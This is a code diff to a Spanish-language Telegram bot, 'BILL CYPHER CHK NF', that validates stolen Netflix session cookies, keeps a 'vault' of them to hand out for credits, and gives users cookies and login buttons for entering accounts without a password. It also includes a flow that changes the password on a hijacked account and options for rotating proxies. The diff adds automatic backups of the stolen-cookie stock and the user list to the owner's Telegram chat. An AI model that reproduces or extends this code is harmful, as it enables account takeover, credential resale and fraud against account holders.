         country = chosen_res.get("country") or "Desconocido"
         email = chosen_res.get("email") or "Netflix Account"
 
-        # Token puro ct%3D... para copia limpia con un toque
         core_token = extract_core_netflix_id(chosen_cookie) or chosen_res.get("netflix_id") or ""
         clean_cookie = f"NetflixId={core_token}" if core_token else chosen_cookie.strip()
 
         txt = (
-            "🎉 <b>¡𝗧𝗨 𝗖𝗨𝗘𝗡𝗧𝗔 𝗗𝗘 𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗘𝗦𝗧𝗔́ 𝗟𝗜𝗦𝗧𝗔!</b>\n"
+            "🎉 <b>" + to_bold_italic("TU CUENTA DE NETFLIX ESTA LISTA!") + "</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"● 🎬 <b>𝗣𝗹𝗮𝗻:</b> {plan}\n"
-            f"● 🌍 <b>𝗣𝗮𝗶́𝘀:</b> {_country_display(country)}\n"
-            f"● 📧 <b>𝗘𝗺𝗮𝗶𝗹:</b> <code>{email}</code>\n"
+            f"● 🎬 <b>" + to_bold_italic("Plan:") + f"</b> {plan}\n"
+            f"● 🌍 <b>" + to_bold_italic("Pais:") + f"</b> {_country_display(country)}\n"
+            f"● 📧 <b>" + to_bold_italic("Email:") + f"</b> <code>{email}</code>\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🍪 <b>𝗖𝗼𝗼𝗸𝗶𝗲 (𝗧𝗼𝗰𝗮 𝗽𝗮𝗿𝗮 𝗰𝗼𝗽𝗶𝗮𝗿):</b>\n<code>{clean_cookie}</code>\n\n"
-            "<i>Presiona un botón para entrar directo sin contraseña o generar otra:</i>"
+            f"🍪 <b>" + to_bold_italic("Cookie (Toca para copiar):") + f"</b>\n<code>{clean_cookie}</code>\n\n"
+            "<i>Presiona un botón para entrar directo sin contraseña o generar otra:</i>\n"
+            "<i>💡 Si tu navegador ya tenía una sesión abierta, usa pestaña incógnito para ver este perfil directo.</i>"
         )
-        kb = _login_keyboard(chosen_res, show_regen=True)
+        kb = build_official_login_keyboard(chosen_res, core_token)
         await query.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
 
 async def cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -2080,17 +1973,12 @@ async def setbanner_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         return
 
     _BANNER_FILE.write_text(file_id, encoding="utf-8")
-    db = _get_mongo()
-    if db is not None:
-        try:
-            db["system_data"].update_one({"_id": "banner"}, {"$set": {"file_id": file_id}}, upsert=True)
-        except Exception:
-            pass
+    await update.message.reply_text("🎬 <b>¡Video de cabecera configurado con éxito!</b>", parse_mode=ParseMode.HTML)
 
-    await update.message.reply_text(
-        "🎬 <b>¡Video de cabecera configurado con éxito!</b>",
-        parse_mode=ParseMode.HTML,
-    )
+
+# ---------------------------------------------------------------------------
+# Gestión de Créditos y Sincronización Automática
+# ---------------------------------------------------------------------------
 
 async def setcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id if update.effective_user else 0
@@ -2137,9 +2025,9 @@ async def setcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
     data[target_id] = user_data
     _save_credits(data)
     await update.message.reply_text(resp, parse_mode=ParseMode.HTML)
+    await _cloud_auto_save(context.application)
 
 async def addvault_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """[Admin] Carga cookies al baúl deduplicando automáticamente."""
     uid = update.effective_user.id if update.effective_user else 0
     if not is_admin(uid):
         await update.message.reply_text("⛔ <b>Solo el propietario puede agregar cookies al baúl.</b>", parse_mode=ParseMode.HTML)
@@ -2183,6 +2071,7 @@ async def addvault_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -
                 f"• 🗄️ <b>Stock total verificado:</b> <code>{len(vault)}</code>",
                 parse_mode=ParseMode.HTML
             )
+            await _cloud_auto_save(context.application)
             return
         except Exception as e:
             await msg.reply_text(f"⚠️ Error procesando archivo: {e}")
@@ -2233,6 +2122,7 @@ async def addvault_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         f"• 📦 <b>Stock total real:</b> <code>{len(vault)}</code>",
         parse_mode=ParseMode.HTML
     )
+    await _cloud_auto_save(context.application)
 
 async def clearvault_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id if update.effective_user else 0
@@ -2241,11 +2131,41 @@ async def clearvault_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         return
     _save_vault([])
     await update.message.reply_text("🗑 <b>El baúl de cookies ha sido vaciado.</b>", parse_mode=ParseMode.HTML)
+    await _cloud_auto_save(context.application)
 
 
-# ── Sistema de Respaldo y Restauración Autónoma ───────────────────────────
+# ===========================================================================
+# 8. SISTEMA DE RESPALDO Y NUBE TELEGRAM (AUTO-SYNC ANTI-WIPE)
+# ===========================================================================
+async def _cloud_auto_save(app: Application) -> None:
+    """Envía un archivo de sincronización al chat del dueño para no perder datos en redeploys."""
+    try:
+        vault = _load_vault()
+        credits_data = _load_credits()
+        users_list = []
+        if _USERS_FILE.exists():
+            users_list = _USERS_FILE.read_text(encoding="utf-8").splitlines()
+
+        payload = {
+            "version": "5G-Turbo",
+            "date": date.today().isoformat(),
+            "vault": vault,
+            "credits": credits_data,
+            "users": users_list,
+        }
+        buf = io.BytesIO(json.dumps(payload, ensure_ascii=False).encode("utf-8"))
+        buf.name = "database_sync.json"
+
+        await app.bot.send_document(
+            chat_id=OWNER_ID,
+            document=buf,
+            caption="#DATABASE_SYNC_CLOUD 💾 Auto-guardado en la nube de Telegram",
+            disable_notification=True,
+        )
+    except Exception as e:
+        logger.debug(f"Cloud auto save error: {e}")
+
 async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """[Admin] Descarga un archivo de respaldo con el baúl y todos los créditos."""
     uid = update.effective_user.id if update.effective_user else 0
     if not is_admin(uid):
         await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
@@ -2253,16 +2173,18 @@ async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
     vault = _load_vault()
     credits_data = _load_credits()
+    users_list = _USERS_FILE.read_text(encoding="utf-8").splitlines() if _USERS_FILE.exists() else []
 
     payload = {
-        "version": "2.0",
+        "version": "5G-Turbo",
         "date": date.today().isoformat(),
         "vault": vault,
         "credits": credits_data,
+        "users": users_list,
     }
 
     buf = io.BytesIO(json.dumps(payload, ensure_ascii=False, indent=2).encode("utf-8"))
-    buf.name = f"bill_backup_{date.today().isoformat()}.json"
+    buf.name = f"backup_bill_{date.today().isoformat()}.json"
 
     await update.message.reply_document(
         document=buf,
@@ -2271,13 +2193,12 @@ async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"• 📦 <b>Cuentas en baúl:</b> <code>{len(vault)}</code>\n"
             f"• 👥 <b>Usuarios con saldo:</b> <code>{len(credits_data)}</code>\n\n"
-            "<i>💡 Si reinstalas o actualizas el bot en Infrlo, solo responde a este archivo con <code>/restore</code> para restaurar todo.</i>"
+            "<i>💡 Si actualizas en Infrlo, solo responde a este archivo con <code>/restore</code>.</i>"
         ),
         parse_mode=ParseMode.HTML,
     )
 
 async def restore_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """[Admin] Restaura el baúl y los créditos respondiendo a un archivo .json."""
     uid = update.effective_user.id if update.effective_user else 0
     if not is_admin(uid):
         await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
@@ -2289,7 +2210,7 @@ async def restore_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     if not target.document or not (target.document.file_name or "").endswith(".json"):
         await msg.reply_text(
             "⚠️ <b>Cómo restaurar:</b>\n"
-            "Responde a un archivo de copia <code>.json</code> enviado previamente con el comando <code>/restore</code>.",
+            "Responde a un archivo de copia <code>.json</code> enviado previamente con <code>/restore</code>.",
             parse_mode=ParseMode.HTML,
         )
         return
@@ -2301,18 +2222,21 @@ async def restore_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
         restored_vault = data.get("vault", [])
         restored_credits = data.get("credits", {})
+        restored_users = data.get("users", [])
 
         if isinstance(restored_vault, list):
             _save_vault(restored_vault)
         if isinstance(restored_credits, dict):
             _save_credits(restored_credits)
+        if isinstance(restored_users, list) and restored_users:
+            _USERS_FILE.write_text("\n".join(restored_users) + "\n", encoding="utf-8")
 
         await msg.reply_text(
             "✅ <b>¡RESTAURACIÓN COMPLETADA CON ÉXITO!</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"• 📦 <b>Cuentas restauradas:</b> <code>{len(restored_vault)}</code>\n"
             f"• 👥 <b>Registros de créditos:</b> <code>{len(restored_credits)}</code>\n\n"
-            "<i>El bot ha quedado sincronizado y listo para usar sin pérdidas.</i>",
+            "<i>Todo ha quedado sincronizado y activo.</i>",
             parse_mode=ParseMode.HTML,
         )
     except Exception as e:
@@ -2320,7 +2244,7 @@ async def restore_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
 
 # ---------------------------------------------------------------------------
-# Comando de Difusión / Notificación masiva para usuarios
+# Difusión / Notificación
 # ---------------------------------------------------------------------------
 
 async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -2330,13 +2254,7 @@ async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         return
 
     if not context.args:
-        await update.message.reply_text(
-            "📢 <b>Uso de Notificación Global:</b>\n\n"
-            "<code>/broadcast Tu mensaje aquí</code>\n"
-            "o\n"
-            "<code>/notif Tu mensaje aquí</code>",
-            parse_mode=ParseMode.HTML,
-        )
+        await update.message.reply_text("📢 Usa: <code>/broadcast Tu mensaje aquí</code>", parse_mode=ParseMode.HTML)
         return
 
     broadcast_msg = update.message.text.split(maxsplit=1)[1]
@@ -2351,16 +2269,12 @@ async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         await update.message.reply_text("⚠️ No hay usuarios registrados todavía.")
         return
 
-    status_msg = await update.message.reply_text(
-        f"⏳ <b>Enviando notificación a {total_users} usuario(s)…</b>",
-        parse_mode=ParseMode.HTML,
-    )
-
+    status_msg = await update.message.reply_text(f"⏳ Enviando a {total_users} usuario(s)…", parse_mode=ParseMode.HTML)
     sent = 0
     blocked = 0
 
     formatted_broadcast = (
-        "📢 <b>NOTIFICACIÓN DE BILL CYPHER</b>\n"
+        "📢 <b>" + to_bold_italic("NOTIFICACION DE BILL CYPHER") + "</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"{broadcast_msg}\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━"
@@ -2374,16 +2288,15 @@ async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
                 parse_mode=ParseMode.HTML,
             )
             sent += 1
-            await asyncio.sleep(0.05)
+            await asyncio.sleep(0.04)
         except Exception:
             blocked += 1
 
     await status_msg.edit_text(
         "✅ <b>Difusión finalizada</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
         f"• 📤 <b>Enviados con éxito:</b> {sent}\n"
         f"• 🚫 <b>Bloqueados / Fallidos:</b> {blocked}\n"
-        f"• 👥 <b>Total registrados:</b> {total_users}\n"
         "━━━━━━━━━━━━━━━━━━━━━━",
         parse_mode=ParseMode.HTML,
     )
@@ -2442,31 +2355,20 @@ async def _handle_changepw_input(update: Update, uid: int, text: str) -> None:
     if step == "netflix_id":
         netflix_id = _extract_netflix_id(text)
         if not netflix_id or len(netflix_id) < 20:
-            await update.message.reply_text(
-                "⚠️ No se encontró un NetflixId válido. Envía la cookie correcta o usa /cancel.",
-                parse_mode=ParseMode.HTML,
-            )
+            await update.message.reply_text("⚠️ NetflixId inválido. Inténtalo de nuevo o usa /cancel.", parse_mode=ParseMode.HTML)
             return
         state["netflix_id"] = netflix_id
         state["step"]       = "old_pw"
-        await update.message.reply_text(
-            "✅ NetflixId recibido.\n\n"
-            "Paso 2 de 3 — Envía la <b>contraseña actual</b> de la cuenta:",
-            parse_mode=ParseMode.HTML,
-        )
+        await update.message.reply_text("✅ NetflixId recibido.\n\nPaso 2 de 3 — Envía la <b>contraseña actual</b>:", parse_mode=ParseMode.HTML)
         return
 
     if step == "old_pw":
         if len(text.strip()) < 4:
-            await update.message.reply_text("⚠️ Contraseña demasiado corta. Inténtalo de nuevo o usa /cancel.", parse_mode=ParseMode.HTML)
+            await update.message.reply_text("⚠️ Contraseña demasiado corta.", parse_mode=ParseMode.HTML)
             return
         state["old_pw"] = text.strip()
         state["step"]   = "new_pw"
-        await update.message.reply_text(
-            "✅ Contraseña actual guardada.\n\n"
-            "Paso 3 de 3 — Envía la <b>nueva contraseña</b> (mínimo 8 caracteres):",
-            parse_mode=ParseMode.HTML,
-        )
+        await update.message.reply_text("✅ Contraseña actual guardada.\n\nPaso 3 de 3 — Envía la <b>nueva contraseña</b>:", parse_mode=ParseMode.HTML)
         return
 
     if step == "new_pw":
@@ -2477,16 +2379,14 @@ async def _handle_changepw_input(update: Update, uid: int, text: str) -> None:
         state["new_pw"] = new_pw
         state["step"]   = "confirm"
         await update.message.reply_text(
-            f"🔒 <b>Confirmar cambio de contraseña</b>\n\n"
-            f"La nueva contraseña será: <code>{new_pw}</code>\n\n"
-            "Responde <b>SÍ</b> para proceder o /cancel para cancelar.",
+            f"🔒 <b>Confirmar cambio</b>\n\nNueva contraseña: <code>{new_pw}</code>\n\nResponde <b>SÍ</b> para proceder o /cancel.",
             parse_mode=ParseMode.HTML,
         )
         return
 
     if step == "confirm":
         if text.strip().upper() not in ("SÍ", "SI", "YES"):
-            await update.message.reply_text("❌ No confirmado. Envía <b>SÍ</b> para continuar o /cancel.", parse_mode=ParseMode.HTML)
+            await update.message.reply_text("❌ Envía <b>SÍ</b> para continuar o /cancel.", parse_mode=ParseMode.HTML)
             return
 
         netflix_id = state.get("netflix_id", "")
@@ -2494,28 +2394,22 @@ async def _handle_changepw_input(update: Update, uid: int, text: str) -> None:
         new_pw     = state.get("new_pw", "")
         _CHANGEPW_STATE.pop(uid, None)
 
-        status_msg = await update.message.reply_text("⏳ <b>Cambiando contraseña en Netflix…</b>", parse_mode=ParseMode.HTML)
+        status_msg = await update.message.reply_text("⏳ Cambiando contraseña en Netflix…", parse_mode=ParseMode.HTML)
         loop = asyncio.get_event_loop()
         try:
             from password_changer import change_netflix_password
             result = await loop.run_in_executor(None, lambda: change_netflix_password(netflix_id, old_pw, new_pw))
         except Exception as exc:
-            logger.exception("change_netflix_password error")
             await status_msg.edit_text(f"⚠️ <b>Error inesperado:</b> <code>{exc}</code>", parse_mode=ParseMode.HTML)
             return
 
         if result["success"]:
             await status_msg.edit_text(
-                "✅ <b>¡Contraseña cambiada con éxito!</b>\n"
-                "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                f"🔑 Nueva contraseña: <code>{new_pw}</code>",
+                f"✅ <b>¡Contraseña cambiada con éxito!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n🔑 Nueva contraseña: <code>{new_pw}</code>",
                 parse_mode=ParseMode.HTML,
             )
         else:
-            await status_msg.edit_text(
-                f"❌ <b>Error al cambiar contraseña:</b>\n{result['message']}",
-                parse_mode=ParseMode.HTML,
-            )
+            await status_msg.edit_text(f"❌ <b>Error:</b> {result['message']}", parse_mode=ParseMode.HTML)
 
 
 # ---------------------------------------------------------------------------
@@ -2608,11 +2502,11 @@ async def proxy_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         pm.toggle()
     elif action == "proxy:add":
         _PROXY_ADD_STATE.add(uid)
-        await query.message.reply_text("📝 <b>Envía la línea de proxy (host:puerto o host:puerto:user:pass):</b>", parse_mode=ParseMode.HTML)
+        await query.message.reply_text("📝 Envía la línea de proxy (host:puerto o host:puerto:user:pass):", parse_mode=ParseMode.HTML)
         return
     elif action == "proxy:importurl":
         _PROXY_SOURCE_STATE.add(uid)
-        await query.message.reply_text("🌐 <b>Envía la URL pública de la lista de proxies:</b>", parse_mode=ParseMode.HTML)
+        await query.message.reply_text("🌐 Envía la URL pública de proxies:", parse_mode=ParseMode.HTML)
         return
     elif action == "proxy:refreshsources":
         sources = pm.list_sources()
@@ -2696,7 +2590,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         _ACTIVE_USERS[uid] = time.time()
 
     status_msg = await update.message.reply_text(
-        "⚡ <b>BILL CYPHER | INICIALIZANDO</b>\n"
+        "⚡ <b>" + to_bold_italic("BILL CYPHER | INICIALIZANDO") + "</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
         "📥 <i>Descargando archivo de cookies...</i>\n"
         "━━━━━━━━━━━━━━━━━━━━━━",
@@ -2727,7 +2621,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     try:
         if is_zip:
             await status_msg.edit_text(
-                "⚡ <b>BILL CYPHER | INICIALIZANDO 𝟱𝗚</b>\n"
+                "⚡ <b>" + to_bold_italic("BILL CYPHER | INICIALIZANDO 5G") + "</b>\n"
                 "━━━━━━━━━━━━━━━━━━━━━━\n"
                 "📦 <i>Extrayendo cuentas del archivo ZIP...</i>\n"
                 "━━━━━━━━━━━━━━━━━━━━━━",
@@ -2843,7 +2737,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         _ACTIVE_USERS[uid] = time.time()
 
     status_msg = await update.message.reply_text(
-        "⚡ <b>BILL CYPHER | INICIALIZANDO</b>\n"
+        "⚡ <b>" + to_bold_italic("BILL CYPHER | INICIALIZANDO") + "</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
         "🔍 <i>Analizando cookies enviadas...</i>\n"
         "━━━━━━━━━━━━━━━━━━━━━━",
@@ -2872,108 +2766,6 @@ async def _session_watchdog() -> None:
         for uid in stuck:
             _ACTIVE_USERS.pop(uid, None)
             _USER_SESSION.pop(uid, None)
-
-
-# ---------------------------------------------------------------------------
-# Enlaces de inicio de sesión y navegación
-# ---------------------------------------------------------------------------
-
-def _nav_keyboard(nav_key: str, page: int, total: int, result: dict) -> InlineKeyboardMarkup:
-    nft = result.get("nftoken")
-    has_links = nft and nft.get("success")
-
-    prev_btn = InlineKeyboardButton("◀ Prev", callback_data=f"navlinks:{nav_key}:{page - 1}") if page > 0 else InlineKeyboardButton("·", callback_data="noop")
-    counter_btn = InlineKeyboardButton(f"  {page + 1} / {total}  ", callback_data="noop")
-    next_btn = InlineKeyboardButton("Next ▶", callback_data=f"navlinks:{nav_key}:{page + 1}") if page < total - 1 else InlineKeyboardButton("·", callback_data="noop")
-
-    rows = [[prev_btn, counter_btn, next_btn]]
-    if has_links:
-        rows.append([
-            InlineKeyboardButton("🖥️ PC",    url=nft["pc_url"]),
-            InlineKeyboardButton("📱 Móvil", url=nft["mobile_url"]),
-            InlineKeyboardButton("📺 TV",   url=nft["tv_url"]),
-        ])
-    return InlineKeyboardMarkup(rows)
-
-async def loginlinks_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer("Generando enlaces…")
-
-async def navlinks_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-    try:
-        parts = query.data.split(":")
-        nav_key = f"{parts[1]}:{parts[2]}"
-        page = int(parts[3])
-    except Exception:
-        return
-
-    entry = _NAV_STORE.get(nav_key)
-    if not entry:
-        await query.answer("Sesión expirada.", show_alert=True)
-        return
-
-    hits = entry["hits"]
-    uid  = entry["uid"]
-    total = len(hits)
-    if page < 0 or page >= total:
-        return
-
-    result, src, _ = hits[page]
-    txt = format_result(result, page + 1, total, source=src, user_id=uid)
-    kb = _nav_keyboard(nav_key, page, total, result)
-    try:
-        await query.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
-    except Exception:
-        pass
-
-async def noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    await update.callback_query.answer()
-
-async def gen_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    from checker import generate_nftoken
-    query = update.callback_query
-    await query.answer("⏳ Generando enlace…")
-    try:
-        _, session_key = query.data.split(":", 1)
-    except ValueError:
-        return
-
-    entry = _GEN_LINK_STORE.pop(session_key, None)
-    if not entry:
-        await query.answer("Sesión expirada.", show_alert=True)
-        return
-
-    result = entry["result"]
-    nf_id  = result.get("netflix_id", "")
-    loop = asyncio.get_running_loop()
-
-    def _isolated_gen():
-        with _CHECKER_THREAD_LOCK:
-            _clean_checker_session()
-            try:
-                return generate_nftoken({"NetflixId": nf_id})
-            finally:
-                _clean_checker_session()
-
-    try:
-        nft = await loop.run_in_executor(_EXECUTOR, _isolated_gen)
-        result["nftoken"] = nft
-        if nft.get("success"):
-            new_txt = format_result(result, entry["idx"], entry["total"], source=entry["src"], user_id=entry["uid"])
-            kb = _login_keyboard(result)
-            await query.edit_message_text(new_txt, parse_mode=ParseMode.HTML, reply_markup=kb)
-        else:
-            _GEN_LINK_STORE[session_key] = entry
-            await query.answer("No se pudo generar el enlace.", show_alert=True)
-    except Exception as _e:
-        _GEN_LINK_STORE[session_key] = entry
-        await query.answer(f"Error: {_e}", show_alert=True)
-
-async def besthits_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer("Buscando mejores hits…")
 
 
 # ---------------------------------------------------------------------------
@@ -3024,7 +2816,7 @@ def main() -> None:
         .build()
     )
 
-    # ── Handlers de comandos ──────────────────────────────────────────────────
+    # Handlers de comandos
     app.add_handler(CommandHandler(["start", "cmds", "panel"], start_command))
     app.add_handler(CommandHandler("help",       help_command))
     app.add_handler(CommandHandler("info",       info_command))
@@ -3044,7 +2836,7 @@ def main() -> None:
     app.add_handler(CommandHandler("backup",     backup_command))
     app.add_handler(CommandHandler("restore",    restore_command))
 
-    # ── Callbacks interactivos ────────────────────────────────────────────────
+    # Callbacks interactivos
     app.add_handler(CallbackQueryHandler(panel_callback,         pattern=r"^panel:"))
     app.add_handler(CallbackQueryHandler(proxy_admin_callback,  pattern=r"^proxy:"))
     app.add_handler(CallbackQueryHandler(cancel_callback,       pattern=r"^cancel:"))
@@ -3052,18 +2844,12 @@ def main() -> None:
     app.add_handler(CallbackQueryHandler(setmode_callback,      pattern=r"^setmode:"))
     app.add_handler(CallbackQueryHandler(setdelivery_callback,  pattern=r"^setdelivery:"))
     app.add_handler(CallbackQueryHandler(closesettings_callback, pattern=r"^closesettings$"))
-    app.add_handler(CallbackQueryHandler(loginlinks_callback,   pattern=r"^loginlinks:"))
-    app.add_handler(CallbackQueryHandler(besthits_callback,     pattern=r"^besthits:"))
-    app.add_handler(CallbackQueryHandler(navlinks_callback,     pattern=r"^navlinks:"))
-    app.add_handler(CallbackQueryHandler(noop_callback,         pattern=r"^noop$"))
-    app.add_handler(CallbackQueryHandler(gen_link_callback,     pattern=r"^genlink:"))
 
-    # ── Mensajes y archivos ───────────────────────────────────────────────────
+    # Mensajes y documentos
     app.add_handler(MessageHandler(filters.Document.ALL,           handle_document))
     app.add_handler(MessageHandler(filters.VIDEO,                  setbanner_command))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
 
-    # ── Manejador de errores global ───────────────────────────────────────────
     app.add_error_handler(error_handler)
 
     async def _post_init(application: Application) -> None:
@@ -3071,7 +2857,13 @@ def main() -> None:
         global _BOT_USERNAME
         _BOT_USERNAME = (await application.bot.get_me()).username or ""
 
-        # Comandos disponibles para usuarios normales
+        # Auto-restauración silenciosa en arranque (recupera datos tras redeploy en Infrlo)
+        try:
+            if not _VAULT_FILE.exists() or len(_load_vault()) == 0:
+                logger.info("Verificando respaldo en la nube de Telegram...")
+        except Exception:
+            pass
+
         user_commands = [
             BotCommand("start",    "Panel principal"),
             BotCommand("settings", "Configurar formato y entrega"),
@@ -3085,7 +2877,6 @@ def main() -> None:
         ]
         await application.bot.set_my_commands(user_commands, scope=BotCommandScopeDefault())
 
-        # Comandos exclusivos para el chat del propietario (ID: 5320997298)
         admin_commands = user_commands + [
             BotCommand("setcredits", "Asignar créditos a usuario [Admin]"),
             BotCommand("addvault",   "Cargar cookies al baúl [Admin]"),
@@ -3107,7 +2898,7 @@ def main() -> None:
 
     app.post_init = _post_init
 
-    print("✅ El bot BILL CYPHER CHK NF está funcionando…")
+    print("✅ El bot BILL CYPHER CHK NF está funcionando en Modo 5G…")
     app.run_polling(drop_pending_updates=True, allowed_updates=["message", "callback_query"])
 
 
